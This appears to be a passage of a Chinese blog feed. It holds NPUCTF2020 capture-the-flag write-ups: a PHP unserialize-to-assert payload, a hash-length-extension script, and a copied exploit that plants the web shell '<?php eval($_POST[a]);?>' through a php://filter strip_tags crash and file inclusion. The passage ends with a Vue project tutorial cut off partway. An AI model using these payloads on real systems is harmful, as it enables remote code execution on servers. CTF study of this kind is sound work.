<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#结果 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下载php_mt_rand那个脚本，使用教程：</p>
<p>记得用make编译c语言的东西，之后./运行即可：</p>
<p><img src="image-20201029203700811.png" alt="image-20201029203700811"></p>
<p>跑出公钥来：1775196155</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">//公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后密码用万能密码一过，即可得到flag</p>
<p>后面的两个一个太难一个是题目down掉了完全用不了。。</p>
]]></content>
  </entry>
  <entry>
    <title>NPUCTF2020</title>
    <url>/2020/10/30/NPUCTF2020/</url>
    <content><![CDATA[<h1 id="web🐕"><a href="#web🐕" class="headerlink" title="web🐕"></a>web🐕</h1><p>列表内容复制粘贴，丢python里面跑一轮就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>啊，别看了，这上面太丢人了。。。原来是因为这是最后一步，</p>
<h1 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h1><p>这道题目和之前在网鼎杯做的phpweb很像，一样的是进行动调：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>flag说是在phpinfo当中,构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<h1 id="Ezinclude"><a href="#Ezinclude" class="headerlink" title="Ezinclude"></a>Ezinclude</h1><p><img src="image-20201030092624788.png" alt="image-20201030092624788"></p>
<p>第一步，这里说是cookies里面有一个hash，是hash拓展攻击：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ha1cyon-ctf.fun:30004/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    a,b=hashpumpy.hashpump(<span class="string">&#x27;a3dabbc779f2fbf8b6f56113ca78a7f9&#x27;</span>,<span class="string">&#x27;123444&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,i)</span><br><span class="line"></span><br><span class="line">    req=requests.get(url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username/password error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(req.text,url+<span class="string">&quot;name=&#123;&#125;&amp;pass=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(urllib.parse.quote(b),a))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>?然而实际做的时候把cookies的值丢进去当作password的就过去了。</p>
<p><img src="image-20201030092846076.png" alt="image-20201030092846076"></p>
<p>读取到三个php文件：</p>
<p>flflflflag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@$name=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setcookie(<span class="string">&quot;Hash&quot;</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$secret=<span class="string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用dirb还能扫出来一个dir.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">		<span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">		[<span class="number">0</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span></span><br><span class="line">		[<span class="number">1</span>]=&gt;</span><br><span class="line">		<span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">include</span>($_GET[<span class="string">&quot;file&quot;</span>])&lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里会列出tmp目录下的所有文件，</p>
<p>那看来还是要写🐎进去啊，可是伪协议被过滤了该怎么写🐎呢？</p>
<p>参考文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;183046</span><br></pre></td></tr></table></figure>

<p>从这篇文章中我们可以知道，当PHP陷入崩溃的时候他会自动的重启，清理掉自己的内存，但是与此同时这就会导致PHP会停止自己手头的工作，这样的话于此同时我们直接POST一段数据，将会被php保存至tmp目录下没有停下。随机生成一个文件，但是又根据题目的dir.php，可以让我们看见tmp目录下有什么，所以直接包裹即可~</p>
<p>抄来的exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[a]);?&gt;&quot;</span></span><br><span class="line">file_data=&#123;</span><br><span class="line">   <span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://a53738f6-1115-449b-b4af-167a2c1a5b1a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>重点就是用string.strip_tags这一点构造出php的内存溢出即可得到。之后访问dir.php可以看见有什么文件成功上传：</p>
<p><img src="image-20201031145743370.png" alt="image-20201031145743370"></p>
<p>进行文件包含即可</p>
<p><img src="image-20201031150107473.png" alt="image-20201031150107473"></p>
<p>flag一样的PHP info（）当中</p>
]]></content>
  </entry>
  <entry>
    <title>Vue总结</title>
    <url>/2020/10/25/Vue%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Vue-part"><a href="#Vue-part" class="headerlink" title="Vue part"></a>Vue part</h1><p>总结了前端项目的搭建，以及自己在这次作品中学到了什么</p>
<a id="more"></a>

<p>Vue我认为学下来就是很爽，基本上不用再各种去绑定JS当中的dom元素了（getElementById什么的）</p>
<p>其中基础源码，有一个index.html</p>
<h2 id="1-index-html"><a href="#1-index-html" class="headerlink" title="1.index.html"></a>1.index.html</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">strong</span>&gt;</span>We&#x27;re sorry but <span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span> doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>启动的时候有一个main.js，APP.vue等等。现在讲一下我是怎么做下来的，我利用到的框架是antdv，再package.json当中可以找到</p>
<h2 id="2-package-json"><a href="#2-package-json" class="headerlink" title="2.package.json"></a>2.package.json</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;,</span><br><span class="line">    &quot;@antv/g2&quot;: &quot;^4.0.15&quot;,</span><br><span class="line">    &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;,</span><br><span class="line">    &quot;axios&quot;: &quot;^0.20.0&quot;,</span><br><span class="line">    &quot;core-js&quot;: &quot;^3.6.5&quot;,</span><br><span class="line">    &quot;echarts&quot;: &quot;^4.9.0&quot;,</span><br><span class="line">    &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;,</span><br><span class="line">    &quot;js-cookie&quot;: &quot;^2.2.1&quot;,</span><br><span class="line">    &quot;jspdf&quot;: &quot;^2.1.1&quot;,</span><br><span class="line">    &quot;less&quot;: &quot;^3.12.2&quot;,</span><br><span class="line">    &quot;less-loader&quot;: &quot;^7.0.1&quot;,</span><br><span class="line">    &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;,</span><br><span class="line">    &quot;react&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-dom&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-window&quot;: &quot;^1.8.5&quot;,</span><br><span class="line">    &quot;vant&quot;: &quot;^2.10.9&quot;,</span><br><span class="line">    &quot;vue&quot;: &quot;^2.6.11&quot;,</span><br><span class="line">    &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;,</span><br><span class="line">    &quot;vue-router&quot;: &quot;^3.4.5&quot;,</span><br><span class="line">    &quot;vuex&quot;: &quot;^3.5.1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;babel-eslint&quot;: &quot;^10.1.0&quot;,</span><br><span class="line">    &quot;eslint&quot;: &quot;^6.7.2&quot;,</span><br><span class="line">    &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;,</span><br><span class="line">    &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>要用的时候再项目根目录下cnpm -i即可。</p>
<p>讲一下路由该怎么做把，首先创建一个</p>
<h2 id="3-router-js"><a href="#3-router-js" class="headerlink" title="3.router.js"></a>3.router.js</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//引入vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>在Vue当中，所有需要引用的东西需要用Vue.use之后才会生效</p>
<p>故我们构造之后的代码框架大致如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//引入vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="comment">//引用page1页面</span></span><br><span class="line"><span class="keyword">import</span> upload  <span class="keyword">from</span> <span class="string">&#x27;./components/upload.vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> login <span class="keyword">from</span> <span class="string">&#x27;./components/login.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义routes路由的集合，数组类型</span></span><br><span class="line"><span class="keyword">const</span> routes=[</span><br><span class="line">    <span class="comment">//单个路由均为对象类型，path代表的是路径，component代表组件</span></span><br><span class="line">    &#123;<span class="attr">path</span>:<span class="string">&#x27;/upload&#x27;</span>,<span class="attr">component</span>:upload&#125;,</span><br><span class="line">    &#123;<span class="attr">path</span>:<span class="string">&#x27;/login&#x27;</span>,<span class="attr">component</span>:login&#125;,</span><br></pre></td></tr></table></figure>

<p>一个Vue文件的格式如下：</p>
<h2 id="4-主入口"><a href="#4-主入口" class="headerlink" title="4.主入口"></a>4.主入口</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt; </span><br><span class="line">      &lt;router-view&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;App&#39;,</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在template当中构造HTML的代码，script当中构造当前页面的JS，而style设置中写css。如果不做限定，CSS将会是全局生效的！</p>
<p>而APP作为主页面，只需要写一句话即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-view</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一句话的意思代码将页面内容托管给Vue，根据vue的Router来显示内容 </p>
<p>而Router的设置在main.js当中（实际上，几乎所有的设置都放在main.js当中进行统一设置）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>在main.js导入的模块可以全项目生效，如果想要普通的生效一个模块，这样构造：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal  &#125; <span class="keyword">from</span> <span class="string">&#x27;ant-design-vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在下面：</span></span><br><span class="line">Vue.use(Modal)</span><br><span class="line">Vue.use(Spin)</span><br><span class="line">Vue.use(Alert)</span><br><span class="line">Vue.use(Form)</span><br><span class="line">Vue.use(axios)</span><br><span class="line">Vue.use(htmlToPdf)</span><br><span class="line">Vue.use(Divider)</span><br><span class="line">Vue.use(Input)</span><br><span class="line">Vue.use(FormModel)</span><br></pre></td></tr></table></figure>

<p>如果想要修改Vue默认的设置，例如我们导入axios的时候这样构造：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line">Vue.prototype.$http = axios</span><br></pre></td></tr></table></figure>

<p>之后我构造了一个公共使用的Vue模板，也就是菜单栏的插件，我是创建了一个commons文件夹，并写在里面</p>
<h2 id="5-插槽"><a href="#5-插槽" class="headerlink" title="5.插槽"></a>5.插槽</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a-layout</span> <span class="attr">id</span>=<span class="string">&quot;components-layout-demo-side&quot;</span> <span class="attr">style</span>=<span class="string">&quot;min-height: 100vh&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout-sider</span> <span class="attr">v-model</span>=<span class="string">&quot;collapsed&quot;</span> <span class="attr">width</span>=<span class="string">&quot;12%&quot;</span> <span class="attr">collapsible</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-menu</span> <span class="attr">theme</span>=<span class="string">&quot;dark&quot;</span> <span class="attr">:default-selected-keys</span>=<span class="string">&quot;[&#x27;1&#x27;]&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;inline&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;upload&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;cloud-download&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  文件上传  </span><br><span class="line">              <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub1&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;area-chart&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  数据分析</span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;report&quot;</span>&gt;</span></span><br><span class="line">              日志分析</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;getpdf&quot;</span>&gt;</span></span><br><span class="line">              获取报告</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub2&quot;</span>&gt;</span></span><br><span class="line">          <span 